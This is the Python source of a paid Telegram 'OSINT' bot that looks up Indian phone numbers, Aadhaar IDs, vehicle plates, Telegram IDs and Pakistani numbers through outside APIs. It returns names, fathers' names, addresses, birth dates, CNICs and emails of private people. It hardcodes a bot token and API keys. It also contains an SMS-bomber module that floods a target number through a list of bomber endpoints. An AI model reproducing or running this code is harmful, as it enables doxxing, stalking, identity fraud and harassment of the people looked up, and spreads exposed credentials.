import telebot, requests, re, sqlite3, datetime, json, os, time, threading
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ==================== CONFIG ====================
BOT_TOKEN = "8622116851:AAG6kEKsxsDithf4ea85nZ9X4v2ia3ueJwc"
ADMIN_ID = 6936978343

NUMBER_API_URL = "https://num-info-redzone.susxbunny.workers.dev/api"
NUMBER_API_KEY = "paid_key@REDZONE21"

SPECIAL_API_URL = "https://sarkariupdate.online/osint/APIX.php?api=api_b3a91f"
TG_NUMBER_API_URL = "https://sarkariupdate.online/osint/APIX.php?api=api_6182a6"
AADHAAR_SPECIAL_API_URL = "https://sarkariupdate.online/osint/APIX.php?api=api_e5ba5c"
PAKISTAN_API_URL = "https://sarkariupdate.online/osint/APIX.php?api=api_9bfe12"

AADHAAR_API_URL = "https://rezone-aadhar-info.bunxred5.workers.dev/api"
AADHAAR_API_KEY = "paid_key_redzone12"

VEHICLE_API_URL = "https://nitin-api-free-user-1k-spacial.vercel.app/api"
VEHICLE_SPECIAL_API_URL = "https://reseller-host.vercel.app/api/rc"

BOMBER_URLS = [
    'https://getofferpro.xyz/bomber/index.php',
    'https://getofferpro.xyz/bomber2/index.php',
    'https://getofferpro.xyz/bomber3/index.php',
    'https://getofferpro.xyz/bomber4/index.php',
    'https://getofferpro.xyz/bomber5/index.php',
    'https://getofferpro.xyz/bomber6/index.php',
    'https://getofferpro.xyz/bomber7/index.php',
    'https://getofferpro.xyz/bomber8/index.php',
    'https://getofferpro.xyz/bomber9/index.php',
    'https://getofferpro.xyz/bomber10/index.php',
    'https://getofferpro.xyz/bomber11/index.php'
]

OWNER = "@Cyber_With_Ranjan"
WEBSITE = "https://cyberwithranjan.in"
GROUP = "https://t.me/cyberwithranjan"
CHANNEL = "https://t.me/cyberwithranjan"
SUPPORT_GROUP = "https://t.me/cyberwithranjan"
UPI_ID = "desi.hacker@ybl"

QR_PATH = os.path.join(os.path.dirname(__file__), 'qr.png')

# ⚡ SPEED: Connection pooling
SESSION = requests.Session()
SESSION.headers.update({'User-Agent': 'Mozilla/5.0 (Linux; Android 10)'})
adapter = requests.adapters.HTTPAdapter(pool_connections=20, pool_maxsize=50, max_retries=1)
SESSION.mount('https://', adapter)
SESSION.mount('http://', adapter)

bot = telebot.TeleBot(BOT_TOKEN, parse_mode='Markdown')
conn = sqlite3.connect('users.db', check_same_thread=False)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    username TEXT, first_name TEXT,
    lang TEXT DEFAULT 'en',
    coins INTEGER DEFAULT 0,
    last_claim TEXT,
    access INTEGER DEFAULT 0,
    premium INTEGER DEFAULT 0,
    premium_expiry TEXT,
    searches INTEGER DEFAULT 0,
    insta_followed INTEGER DEFAULT 0,
    website_visited INTEGER DEFAULT 0
)''')
conn.commit()

BOMBER_STATE = {}

# ==================== LANGUAGES ====================
L = {
    'en': {'lang': "🌐 **Select Language:**", 'welcome': "🎁 **Welcome to OSINT Bot!**\n\n🪙 **FREE Daily Coin**\n• Claim 1 coin every day\n• 1 Coin = 1 Search\n\n💎 **Premium Plans**\n• 1 Day – ₹10\n• 1 Week – ₹60\n• 1 Month – ₹101\n\n📸 Scan QR to buy premium\n👇 Or claim FREE coin now!", 'claim_btn': "🎁 FREE Daily Coin Claim", 'buy_premium': "💳 Buy Premium", 'already_claimed': "✅ Aaj ka coin already claim kar chuke ho!\n\n⏰ Kal phir aana", 'coin_claimed': "🎉 **Congratulations!**\n\n🪙 You got 1 FREE Coin!\n🪙 Total Coins: {coins}\n\n✅ Now you can search!", 'main_menu': "📱 **Main Menu**", 'search': "🔍 Search", 'premium': "💎 Premium", 'number': "📱 Number", 'vehicle': "🚗 Vehicle", 'vehicle_special': "🚘 Vehicle Spl", 'aadhaar': "🆔 Aadhaar", 'profile_btn': "👤 Profile", 'help_btn': "❓ Help", 'about_btn': "ℹ️ About", 'clear_btn': "🗑️ Clear", 'back': "🔙 Back", 'owner': "👨‍💻 Owner", 'admin_only': "⚠️ Not authorized.", 'enter_number': "📱 Send 10-digit number:", 'enter_vehicle': "🚗 Send vehicle number:", 'enter_vehicle_special': "🚘 Send vehicle for Special:", 'enter_aadhaar': "🆔 Send 12-digit Aadhaar:", 'enter_special': "🔍 Send number for Special lookup:", 'enter_aadhaar_special': "🆔 Send 12-digit Aadhaar for Special:", 'enter_tg_number': "📞 Send Telegram ID:", 'enter_pakistan': "🇵🇰 Send Pakistan number (03XXXXXXXXX):", 'help': "📖 /start /menu /num /special /vehicle /vehiclespecial /aadhaar /aadharspecial /tgnumber /pakistan /boom /claim /premium /profile /contact /clear /language /website /myid", 'profile': "👤 **Profile**\n\n🆔 ID: `{uid}`\n🪙 Coins: **{coins}**\n💎 Premium: {prem}\n🔍 Searches: {searches}", 'about': "🤖 OSINT v3.0\n👨‍💻 @Cyber_With_Ranjan", 'nc': "❌ No coins! Claim daily 1 FREE coin.", 'stats_text': "📊 Stats\n👥 Total: {total}\n💎 Premium: {premium}\n🪙 Coins: {coins}\n🔍 Searches: {searches}"},
    'hi': {'lang': "🌐 **भाषा चुनें:**", 'welcome': "🎁 **OSINT Bot में स्वागत!**\n\n🪙 **FREE Daily Coin**\n• रोज 1 FREE Coin claim करें\n• 1 Coin = 1 Search\n\n💎 **प्रीमियम प्लान**\n• 1 दिन – ₹10\n• 1 सप्ताह – ₹60\n• 1 महीना – ₹101\n\n📸 QR स्कैन करके premium खरीदें\n👇 या अभी FREE coin claim करें!", 'claim_btn': "🎁 FREE Daily Coin Claim", 'buy_premium': "💳 प्रीमियम खरीदें", 'already_claimed': "✅ आज का coin already claim कर चुके हो!\n\n⏰ कल फिर आना", 'coin_claimed': "🎉 **बधाई हो!**\n\n🪙 आपको 1 FREE Coin मिला!\n🪙 Total Coins: {coins}\n\n✅ अब search कर सकते हैं!", 'main_menu': "📱 **मुख्य मेनू**", 'search': "🔍 खोज", 'premium': "💎 प्रीमियम", 'number': "📱 नंबर", 'vehicle': "🚗 वाहन", 'vehicle_special': "🚘 वाहन Spl", 'aadhaar': "🆔 आधार", 'profile_btn': "👤 प्रोफाइल", 'help_btn': "❓ मदद", 'about_btn': "ℹ️ जानकारी", 'clear_btn': "🗑️ साफ करें", 'back': "🔙 वापस", 'owner': "👨‍💻 मालिक", 'admin_only': "⚠️ अधिकृत नहीं।", 'enter_number': "📱 10 अंकों का नंबर भेजें:", 'enter_vehicle': "🚗 वाहन नंबर भेजें:", 'enter_vehicle_special': "🚘 Special वाहन:", 'enter_aadhaar': "🆔 12 अंकों का आधार:", 'enter_special': "🔍 Special के लिए number भेजें:", 'enter_aadhaar_special': "🆔 12-digit Aadhaar for Special:", 'enter_tg_number': "📞 Telegram ID भेजें:", 'enter_pakistan': "🇵🇰 Pakistan number (03XXXXXXXXX):", 'help': "📖 /start /menu /num /special /vehicle /vehiclespecial /aadhaar /aadharspecial /tgnumber /pakistan /boom /claim /premium /profile /contact /clear /language /website /myid", 'profile': "👤 **प्रोफाइल**\n\n🆔 ID: `{uid}`\n🪙 Coins: **{coins}**\n💎 प्रीमियम: {prem}\n🔍 खोज: {searches}", 'about': "🤖 OSINT v3.0\n👨‍💻 @Cyber_With_Ranjan", 'nc': "❌ Coin नहीं! रोज 1 FREE coin claim करें।", 'stats_text': "📊 आँकड़े\n👥 कुल: {total}\n💎 प्रीमियम: {premium}\n🪙 Coins: {coins}\n🔍 खोज: {searches}"},
    'bn': {'lang': "🌐 **ভাষা নির্বাচন:**", 'welcome': "🎁 **OSINT Bot এ স্বাগতম!**\n\n🪙 **FREE Daily Coin**\n• প্রতিদিন ১টি FREE Coin\n• ১ Coin = ১ Search\n\n💎 **প্রিমিয়াম প্ল্যান**\n• ১ দিন – ₹১০\n• ১ সপ্তাহ – ₹৬০\n• ১ মাস – ₹১০১\n\n📸 QR স্ক্যান করুন\n👇 অথবা FREE coin claim করুন!", 'claim_btn': "🎁 FREE Daily Coin Claim", 'buy_premium': "💳 প্রিমিয়াম কিনুন", 'already_claimed': "✅ আজকের coin claim হয়েছেন!\n\n⏰ কাল আবার আসুন", 'coin_claimed': "🎉 **অভিনন্দন!**\n\n🪙 ১টি FREE Coin পেয়েছেন!\n🪙 Total: {coins}\n\n✅ এখন search করুন!", 'main_menu': "📱 **মেনু**", 'search': "🔍 অনুসন্ধান", 'premium': "💎 প্রিমিয়াম", 'number': "📱 নম্বর", 'vehicle': "🚗 গাড়ি", 'vehicle_special': "🚘 গাড়ি Spl", 'aadhaar': "🆔 আধার", 'profile_btn': "👤 প্রোফাইল", 'help_btn': "❓ সাহায্য", 'about_btn': "ℹ️ তথ্য", 'clear_btn': "🗑️ মুছুন", 'back': "🔙 ফিরে", 'owner': "👨‍💻 মালিক", 'admin_only': "⚠️ অনুমতি নেই।", 'enter_number': "📱 ১০ অঙ্কের নম্বর:", 'enter_vehicle': "🚗 গাড়ির নম্বর:", 'enter_vehicle_special': "🚘 স্পেশাল গাড়ি:", 'enter_aadhaar': "🆔 ১২ অঙ্কের আধার:", 'enter_special': "🔍 Special নম্বর:", 'enter_aadhaar_special': "🆔 ১২ অঙ্কের আধার Special:", 'enter_tg_number': "📞 Telegram ID:", 'enter_pakistan': "🇵🇰 Pakistan number (03XXXXXXXXX):", 'help': "📖 /start /menu /num /special /vehicle /vehiclespecial /aadhaar /aadharspecial /tgnumber /pakistan /boom /claim /premium /profile /contact /clear /language /website /myid", 'profile': "👤 **প্রোফাইল**\n\n🆔 `{uid}`\n🪙 Coins: **{coins}**\n💎 প্রিমিয়াম: {prem}\n🔍 অনুসন্ধান: {searches}", 'about': "🤖 OSINT v3.0\n👨‍💻 @Cyber_With_Ranjan", 'nc': "❌ Coin নেই! দৈনিক ১ FREE coin নিন।", 'stats_text': "📊 পরিসংখ্যান\n👥 মোট: {total}\n💎 প্রিমিয়াম: {premium}\n🪙 Coins: {coins}\n🔍 অনুসন্ধান: {searches}"},
    'mr': {'lang': "🌐 **भाषा निवडा:**", 'welcome': "🎁 **OSINT Bot मध्ये स्वागत!**\n\n🪙 **FREE Daily Coin**\n• रोज १ FREE Coin\n• १ Coin = १ Search\n\n💎 **प्रीमियम प्लान**\n• १ दिवस – ₹१०\n• १ आठवडा – ₹६०\n• १ महिना – ₹१०१\n\n📸 QR स्कॅन करा\n👇 किंवा FREE coin claim करा!", 'claim_btn': "🎁 FREE Daily Coin Claim", 'buy_premium': "💳 प्रीमियम खरेदी", 'already_claimed': "✅ आजचा coin claim केला!\n\n⏰ उद्या या", 'coin_claimed': "🎉 **अभिनंदन!**\n\n🪙 १ FREE Coin मिळाला!\n🪙 Total: {coins}\n\n✅ आता search करा!", 'main_menu': "📱 **मुख्य मेनू**", 'search': "🔍 शोध", 'premium': "💎 प्रीमियम", 'number': "📱 क्रमांक", 'vehicle': "🚗 वाहन", 'vehicle_special': "🚘 वाहन Spl", 'aadhaar': "🆔 आधार", 'profile_btn': "👤 प्रोफाइल", 'help_btn': "❓ मदत", 'about_btn': "ℹ️ माहिती", 'clear_btn': "🗑️ साफ करा", 'back': "🔙 मागे", 'owner': "👨‍💻 मालक", 'admin_only': "⚠️ अधिकार नाही.", 'enter_number': "📱 १० अंकी क्रमांक:", 'enter_vehicle': "🚗 वाहन क्रमांक:", 'enter_vehicle_special': "🚘 स्पेशल वाहन:", 'enter_aadhaar': "🆔 १२ अंकी आधार:", 'enter_special': "🔍 Special क्रमांक:", 'enter_aadhaar_special': "🆔 १२ अंकी आधार Special:", 'enter_tg_number': "📞 Telegram ID:", 'enter_pakistan': "🇵🇰 Pakistan number (03XXXXXXXXX):", 'help': "📖 /start /menu /num /special /vehicle /vehiclespecial /aadhaar /aadharspecial /tgnumber /pakistan /boom /claim /premium /profile /contact /clear /language /website /myid", 'profile': "👤 **प्रोफाइल**\n\n🆔 `{uid}`\n🪙 Coins: **{coins}**\n💎 प्रीमियम: {prem}\n🔍 शोध: {searches}", 'about': "🤖 OSINT v3.0\n👨‍💻 @Cyber_With_Ranjan", 'nc': "❌ Coin नाही! रोज १ FREE coin.", 'stats_text': "📊 आकडेवारी\n👥 एकूण: {total}\n💎 प्रीमियम: {premium}\n🪙 Coins: {coins}\n🔍 शोध: {searches}"},
    'ur': {'lang': "🌐 **زبان منتخب:**", 'welcome': "🎁 **OSINT Bot میں خوش آمدید!**\n\n🪙 **FREE Daily Coin**\n• روزانہ ۱ FREE Coin\n• ۱ Coin = ۱ Search\n\n💎 **پریمیم پلان**\n• ۱ دن – ₹۱۰\n• ۱ ہفتہ – ₹۶۰\n• ۱ مہینہ – ₹۱۰۱\n\n📸 QR اسکین کریں\n👇 یا FREE coin claim کریں!", 'claim_btn': "🎁 FREE Daily Coin Claim", 'buy_premium': "💳 پریمیم خریدیں", 'already_claimed': "✅ آج کا coin claim کر چکے!\n\n⏰ کل آئیں", 'coin_claimed': "🎉 **مبارک ہو!**\n\n🪙 ۱ FREE Coin ملا!\n🪙 Total: {coins}\n\n✅ اب search کریں!", 'main_menu': "📱 **مین مینو**", 'search': "🔍 تلاش", 'premium': "💎 پریمیم", 'number': "📱 نمبر", 'vehicle': "🚗 گاڑی", 'vehicle_special': "🚘 گاڑی Spl", 'aadhaar': "🆔 آدھار", 'profile_btn': "👤 پروفائل", 'help_btn': "❓ مدد", 'about_btn': "ℹ️ معلومات", 'clear_btn': "🗑️ صاف", 'back': "🔙 واپس", 'owner': "👨‍💻 مالک", 'admin_only': "⚠️ مجاز نہیں۔", 'enter_number': "📱 ۱۰ ہندسی نمبر:", 'enter_vehicle': "🚗 گاڑی نمبر:", 'enter_vehicle_special': "🚘 سپیشل گاڑی:", 'enter_aadhaar': "🆔 ۱۲ ہندسی آدھار:", 'enter_special': "🔍 Special نمبر:", 'enter_aadhaar_special': "🆔 ۱۲ ہندسی آدھار Special:", 'enter_tg_number': "📞 Telegram ID:", 'enter_pakistan': "🇵🇰 Pakistan number (03XXXXXXXXX):", 'help': "📖 /start /menu /num /special /vehicle /vehiclespecial /aadhaar /aadharspecial /tgnumber /pakistan /boom /claim /premium /profile /contact /clear /language /website /myid", 'profile': "👤 **پروفائل**\n\n🆔 `{uid}`\n🪙 Coins: **{coins}**\n💎 پریمیم: {prem}\n🔍 تلاش: {searches}", 'about': "🤖 OSINT v3.0\n👨‍💻 @Cyber_With_Ranjan", 'nc': "❌ Coin نہیں! روزانہ ۱ FREE coin.", 'stats_text': "📊 اعداد\n👥 کل: {total}\n💎 پریمیم: {premium}\n🪙 Coins: {coins}\n🔍 تلاش: {searches}"},
    'ta': {'lang': "🌐 **மொழி தேர்வு:**", 'welcome': "🎁 **OSINT Bot க்கு வரவேற்கிறோம்!**\n\n🪙 **FREE Daily Coin**\n• தினமும் 1 FREE Coin\n• 1 Coin = 1 Search\n\n💎 **பிரீமியம் திட்டம்**\n• 1 நாள் – ₹10\n• 1 வாரம் – ₹60\n• 1 மாதம் – ₹101\n\n📸 QR ஸ்கேன் செய்யவும்\n👇 அல்லது FREE coin claim!", 'claim_btn': "🎁 FREE Daily Coin Claim", 'buy_premium': "💳 பிரீமியம் வாங்க", 'already_claimed': "✅ இன்றைய coin claim!\n\n⏰ நாளை வாருங்கள்", 'coin_claimed': "🎉 **வாழ்த்துக்கள்!**\n\n🪙 1 FREE Coin!\n🪙 Total: {coins}\n\n✅ Search செய்யுங்கள்!", 'main_menu': "📱 **மெனு**", 'search': "🔍 தேடு", 'premium': "💎 பிரீமியம்", 'number': "📱 எண்", 'vehicle': "🚗 வாகனம்", 'vehicle_special': "🚘 வாகனம் Spl", 'aadhaar': "🆔 ஆதார்", 'profile_btn': "👤 சுயவிவரம்", 'help_btn': "❓ உதவி", 'about_btn': "ℹ️ தகவல்", 'clear_btn': "🗑️ அழி", 'back': "🔙 பின்", 'owner': "👨‍💻 உரிமை", 'admin_only': "⚠️ அனுமதி இல்லை.", 'enter_number': "📱 10 இலக்க எண்:", 'enter_vehicle': "🚗 வாகன எண்:", 'enter_vehicle_special': "🚘 ஸ்பெஷல் வாகனம்:", 'enter_aadhaar': "🆔 12 இலக்க ஆதார்:", 'enter_special': "🔍 Special எண்:", 'enter_aadhaar_special': "🆔 12 இலக்க ஆதார் Special:", 'enter_tg_number': "📞 Telegram ID:", 'enter_pakistan': "🇵🇰 Pakistan number (03XXXXXXXXX):", 'help': "📖 /start /menu /num /special /vehicle /vehiclespecial /aadhaar /aadharspecial /tgnumber /pakistan /boom /claim /premium /profile /contact /clear /language /website /myid", 'profile': "👤 **சுயவிவரம்**\n\n🆔 `{uid}`\n🪙 Coins: **{coins}**\n💎 பிரீமியம்: {prem}\n🔍 தேடல்: {searches}", 'about': "🤖 OSINT v3.0\n👨‍💻 @Cyber_With_Ranjan", 'nc': "❌ Coin இல்லை! தினமும் 1 FREE coin.", 'stats_text': "📊 புள்ளி\n👥 மொத்தம்: {total}\n💎 பிரீமியம்: {premium}\n🪙 Coins: {coins}\n🔍 தேடல்: {searches}"}
}

# ==================== HELPERS ====================
def _md_escape(s):
    """Escape markdown special chars from user input"""
    if not s: return ""
    for ch in ['_', '*', '[', ']', '`', '\\']:
        s = s.replace(ch, '\\' + ch)
    return s

_lang_cache = {}

def gl(i):
    if i in _lang_cache: return _lang_cache[i]
    try:
        c.execute("SELECT lang FROM users WHERE user_id=?", (i,)); r = c.fetchone()
        v = r[0] if r else 'en'
        _lang_cache[i] = v
        return v
    except: return 'en'

def sl(i, l):
    _lang_cache[i] = l
    try:
        c.execute("UPDATE users SET lang=? WHERE user_id=?", (l, i)); conn.commit()
    except: pass

def ensure_user(i, name="User", un=""):
    try:
        c.execute("INSERT OR IGNORE INTO users (user_id, first_name, username) VALUES (?, ?, ?)", (i, name, un))
        conn.commit()
    except: pass

def au(i, n, u=""):
    ensure_user(i, n, u)

def gc(i):
    try:
        c.execute("SELECT coins FROM users WHERE user_id=?", (i,)); r = c.fetchone()
        return r[0] if r else 0
    except: return 0

def dc(i):
    try:
        if ip(i):
            c.execute("UPDATE users SET searches=searches+1 WHERE user_id=?", (i,)); conn.commit()
            return True
        coins = gc(i)
        if coins <= 0: return False
        c.execute("UPDATE users SET coins=coins-1, searches=searches+1 WHERE user_id=?", (i,)); conn.commit()
        return True
    except: return False

def claim_daily_coin(i):
    try:
        ensure_user(i)
        t = datetime.datetime.now().date().isoformat()
        c.execute("SELECT last_claim FROM users WHERE user_id=?", (i,)); r = c.fetchone()
        if r and r[0] == t: return False
        c.execute("UPDATE users SET coins=coins+1, last_claim=?, access=1 WHERE user_id=?", (t, i))
        conn.commit()
        return True
    except: return False

_prem_cache = {}
_prem_cache_time = {}

def ip(i):
    if i == ADMIN_ID: return True
    now = time.time()
    if i in _prem_cache and now - _prem_cache_time.get(i, 0) < 60:
        return _prem_cache[i]
    try:
        c.execute("SELECT premium, premium_expiry FROM users WHERE user_id=?", (i,)); r = c.fetchone()
        if not r or r[0] == 0:
            _prem_cache[i] = False; _prem_cache_time[i] = now; return False
        if r[1]:
            try:
                if datetime.datetime.fromisoformat(r[1]) > datetime.datetime.now():
                    _prem_cache[i] = True; _prem_cache_time[i] = now; return True
            except:
                _prem_cache[i] = True; _prem_cache_time[i] = now; return True
            c.execute("UPDATE users SET premium=0, premium_expiry=NULL WHERE user_id=?", (i,)); conn.commit()
            _prem_cache[i] = False; _prem_cache_time[i] = now; return False
        _prem_cache[i] = True; _prem_cache_time[i] = now; return True
    except: return False

def ap(i, d=30):
    try:
        ensure_user(i, "Admin_Added")
        e = (datetime.datetime.now() + datetime.timedelta(days=d)).isoformat()
        c.execute("UPDATE users SET premium=1, premium_expiry=?, access=1 WHERE user_id=?", (e, i))
        conn.commit()
        _prem_cache.pop(i, None)
        return True
    except: return False

def add_coins_db(i, coins):
    try:
        ensure_user(i, "Admin_Added")
        c.execute("UPDATE users SET coins=coins+? WHERE user_id=?", (coins, i))
        conn.commit()
        return gc(i)
    except: return 0

def get_total_searches():
    try:
        c.execute("SELECT SUM(searches) FROM users"); r = c.fetchone()
        return r[0] if r and r[0] else 0
    except: return 0

# ==================== FAST HACKER LOADING ====================
def hacker_loading(chat_id, msg_id, query, search_type='NUMBER'):
    frames = [
        (55, "⚡", "SCANNING DB",     "sqlmap --dump"),
        (100, "✅", "ACCESS GRANTED", "root@hacker:~$ SUCCESS")
    ]
    for percent, icon, status, cmd in frames:
        filled = percent // 10
        bar = "🟩" * filled + "⬛" * (10 - filled)
        try:
            bot.edit_message_text(
                f"`🟢 HACKER TERMINAL v3.0`\n"
                f"`━━━━━━━━━━━━━━━━━━━━━━━`\n"
                f"{bar} `{percent}%`\n"
                f"`{icon} {status}`\n"
                f"`$ {cmd}`\n"
                f"`🎯 TARGET : {query}`\n"
                f"`📡 METHOD : {search_type}`",
                chat_id, msg_id, parse_mode='Markdown'
            )
            time.sleep(0.06)
        except: pass

# ==================== API FUNCTIONS ====================
def fetch_number(num):
    try:
        r = SESSION.get(f"{NUMBER_API_URL}?key={NUMBER_API_KEY}&number={num}", timeout=6)
        if r.status_code == 200: return r.json()
        return None
    except: return None

def fetch_special(phone):
    try:
        r = SESSION.get(f"{SPECIAL_API_URL}&q={phone}", timeout=7)
        if r.status_code == 200: return r.json()
        return None
    except: return None

def fetch_tg_number(tg_id):
    try:
        r = SESSION.get(f"{TG_NUMBER_API_URL}&q={tg_id}", timeout=7)
        if r.status_code == 200: return r.json()
        return None
    except: return None

def fetch_aadhaar_special(aadhaar_num):
    try:
        r = SESSION.get(f"{AADHAAR_SPECIAL_API_URL}&q={aadhaar_num}", timeout=7)
        if r.status_code == 200: return r.json()
        return None
    except: return None

def fetch_pakistan(pk_num):
    try:
        r = SESSION.get(f"{PAKISTAN_API_URL}&q={pk_num}", timeout=7)
        if r.status_code == 200: return r.json()
        return None
    except: return None

def fetch_aadhaar(aadhaar_num):
    try:
        r = SESSION.get(f"{AADHAAR_API_URL}?key={AADHAAR_API_KEY}&id={aadhaar_num}", timeout=8)
        if r.status_code == 200: return r.json()
        return None
    except: return None

def fetch_vehicle(vehicle_num):
    try:
        r = SESSION.get(f"{VEHICLE_API_URL}?type=vehicle&search={vehicle_num.upper()}", timeout=6)
        if r.status_code == 200:
            data = r.json()
            if data.get('regNo'): return data
        return None
    except: return None

def fetch_vehicle_special(vehicle_num):
    try:
        r = SESSION.get(f"{VEHICLE_SPECIAL_API_URL}?number={vehicle_num.upper()}", timeout=6)
        if r.status_code == 200: return r.json()
        return None
    except: return None

# ==================== FORMAT RESULT ====================
def format_result(data, query, is_vehicle=False, is_special=False, is_aadhaar=False, is_number_special=False,
                  is_aadhaar_special=False, is_tg_number=False, is_pakistan=False):
    if is_aadhaar_special:
        if not data or data.get('status') != 'success': return "`❌ No data`"
        records = data.get('data', [])
        if not records: return "`❌ No records`"
        text = f"`🆔 AADHAAR SPECIAL`\n`━━━━━━━━━━━━━━━━━━━━━`\n`🔎 Aadhaar: {query}`\n`📊 Total: {len(records)}`\n"
        for i, rec in enumerate(records[:3], 1):
            text += f"\n`📌 Record #{i}`\n"
            text += f"`📱 Mobile: {rec.get('mobile', 'N/A')}`\n"
            text += f"`👤 Name: {rec.get('name', 'N/A')}`\n"
            text += f"`👨 Father: {rec.get('fname', 'N/A')}`\n"
            text += f"`🏠 Address: {str(rec.get('address', 'N/A'))[:80]}`\n"
            text += f"`📞 Alt: {rec.get('alt', 'N/A')}`\n"
            text += f"`📡 Circle: {rec.get('circle', 'N/A')}`\n"
            if rec.get('email'): text += f"`📧 Email: {rec.get('email')}`\n"
        if len(records) > 3: text += f"\n`... and {len(records)-3} more`"
        text += f"\n`🔐 {OWNER}`"
        return text
    elif is_pakistan:
        if not data or data.get('status') != 'success': return "`❌ No data`"
        result = data.get('result', {})
        records = result.get('records', []) if result else []
        if not records: return "`❌ No records`"
        text = f"`🇵🇰 PAKISTAN NUMBER`\n`━━━━━━━━━━━━━━━━━━━━━`\n`📱 Number: {result.get('number', query)}`\n`📊 Type: {result.get('type', 'N/A')}`\n`📋 Count: {result.get('count', len(records))}`\n"
        for i, rec in enumerate(records[:3], 1):
            text += f"\n`📌 Record #{i}`\n"
            text += f"`👤 Name: {rec.get('name', 'N/A')}`\n"
            text += f"`🆔 CNIC: {rec.get('cnic', 'N/A')}`\n"
            text += f"`🏠 Address: {str(rec.get('address', 'N/A'))[:100]}`\n"
        text += f"\n`🔐 {OWNER}`"
        return text
    elif is_tg_number:
        if not data or data.get('status') != 'success': return "`❌ No data`"
        d = data.get('data', {})
        if not d: return "`❌ No records`"
        owner_num = d.get('Owner≠Number') or d.get('Owner') or 'N/A'
        tg_id = d.get('TG -ID') or d.get('TG-ID') or query
        country = d.get('Country-Code') or 'N/A'
        return f"`📞 TG TO NUMBER`\n`━━━━━━━━━━━━━━━━━━━━━`\n`🆔 TG ID: {tg_id}`\n`📱 Owner Number: {owner_num}`\n`🌍 Country: {country}`\n`🔐 {OWNER}`"
    elif is_number_special:
        if not data or data.get('status') != 'success': return "`❌ No data`"
        records = data.get('data', [])
        if not records: return "`❌ No records`"
        text = f"`🔍 SPECIAL LOOKUP`\n`━━━━━━━━━━━━━━━━━━━━━`\n`🔎 Query: {query}`\n`📊 Total: {len(records)}`\n"
        for i, rec in enumerate(records[:3], 1):
            text += f"\n`📌 Record #{i}`\n"
            text += f"`📱 Mobile: {rec.get('mobile', 'N/A')}`\n"
            text += f"`👤 Name: {rec.get('name', 'N/A')}`\n"
            text += f"`👨 Father: {rec.get('fname', 'N/A')}`\n"
            text += f"`🏠 Address: {str(rec.get('address', 'N/A'))[:80]}`\n"
            text += f"`📞 Alt: {rec.get('alt', 'N/A')}`\n"
            text += f"`📡 Circle: {rec.get('circle', 'N/A')}`\n"
            if rec.get('id'): text += f"`🆔 ID: {rec.get('id')}`\n"
            if rec.get('email'): text += f"`📧 Email: {rec.get('email')}`\n"
        if len(records) > 3: text += f"\n`... and {len(records)-3} more`"
        text += f"\n`🔐 {OWNER}`"
        return text
    elif is_aadhaar:
        if not data: return "`❌ No data`"
        info = {}
        if isinstance(data, dict):
            if 'data' in data and isinstance(data['data'], dict): info = data['data']
            elif 'result' in data and isinstance(data['result'], dict): info = data['result']
            else: info = data
        if not info or not info.get('name'): return "`❌ No records`"
        return f"`🆔 AADHAAR INTEL`\n`━━━━━━━━━━━━━━━━━━━━━`\n`🆔 {info.get('aadhaar') or info.get('aadhar', query)}`\n`👤 Name: {info.get('name', 'N/A')}`\n`👨 Father: {info.get('father') or info.get('fname', 'N/A')}`\n`📅 DOB: {info.get('dob') or 'N/A'}`\n`⚥ Gender: {info.get('gender') or 'N/A'}`\n`🏠 Address: {info.get('address') or info.get('addr', 'N/A')}`\n`📱 Phone: {info.get('phone') or info.get('mobile', 'N/A')}`\n`📧 Email: {info.get('email') or 'N/A'}`\n`🔐 {OWNER}`"
    elif is_special:
        if not data or not data.get('reg_no'): return "`❌ Not found`"
        i = data.get('response', {})
        return f"`🚘 VEHICLE SPECIAL`\n`━━━━━━━━━━━━━━━━━━━━━`\n`🚘 {data.get('reg_no', 'N/A')}`\n`👤 Owner: {i.get('ownerName', 'N/A')}`\n`🚗 Class: {i.get('vehicle_class', 'N/A')}`\n`⛽ Fuel: {i.get('fuel_type', 'N/A')}`\n`🔧 Engine: {i.get('engine_no', 'N/A')}`\n`🔩 Chassis: {i.get('chassis_no', 'N/A')}`\n`📅 Reg: {i.get('reg_date', 'N/A')}`\n`🏭 Model: {i.get('maker_model', 'N/A')}`\n`🔐 {OWNER}`"
    elif is_vehicle:
        if not data or not data.get('regNo'): return "`❌ Not found`"
        i = data.get('response', {}); rto = i.get('rtoData', {})
        return f"`🚗 VEHICLE INTEL`\n`━━━━━━━━━━━━━━━━━━━━━`\n`🚘 {data.get('regNo', 'N/A')}`\n`👤 Owner: {i.get('ownerName', 'N/A')}`\n`🏭 Company: {i.get('manufacturer', 'N/A')}`\n`🚗 Model: {i.get('vehicle', 'N/A')}`\n`📅 Reg: {i.get('regDate', 'N/A')}`\n`🏢 RTO: {rto.get('rtoCode', 'N/A')}`\n`🏠 Address: {i.get('presentAddress', 'N/A')}`\n`🔐 {OWNER}`"
    else:
        if not data: return "`❌ No data`"
        if isinstance(data, dict):
            if 'result' in data and isinstance(data['result'], list) and data['result']: info = data['result'][0]
            elif 'data' in data and isinstance(data['data'], dict): info = data['data']
            else: info = data
        else: info = {}
        if not info or not info.get('name'): return "`❌ No records`"
        return f"`📱 NUMBER INTEL`\n`━━━━━━━━━━━━━━━━━━━━━`\n`📱 {query}`\n`👤 Name: {info.get('name', 'N/A')}`\n`👨 Father: {info.get('fname') or info.get('father', 'N/A')}`\n`🆔 Aadhar: {info.get('aadhar') or info.get('aadhaar', 'N/A')}`\n`🏠 Address: {info.get('address') or info.get('addr', 'N/A')}`\n`📡 Circle: {info.get('circle') or info.get('operator', 'N/A')}`\n`📧 Email: {info.get('email') or 'N/A'}`\n`📞 Alt: {info.get('alt') or 'N/A'}`\n`🔐 {OWNER}`"

def send_log(uid, un, query, data, stype="NUMBER"):
    """✅ FIX: Markdown escape username"""
    try:
        un_safe = _md_escape(un or 'N/A')
        bot.send_message(ADMIN_ID, f"📊 {stype} LOG\n👤 @{un_safe} ({uid})\n🔍 {query}")
    except:
        try:
            bot.send_message(ADMIN_ID, f"📊 {stype} LOG\nUser: {uid}\nQuery: {query}")
        except: pass

# ==================== SMS BOMBER ====================
def is_valid_number(num):
    return bool(re.match(r'^[6-9]\d{9}$', num))

def send_bomber_request(url, number, message):
    headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10)'}
    for data in [{'number': number, 'message': message}, {'num': number, 'msg': message}, {'mobile': number, 'text': message}]:
        try:
            r = requests.post(url, data=data, headers=headers, timeout=5)
            if r.status_code in [200, 201, 202, 301, 302]: return True
        except: pass
    return False

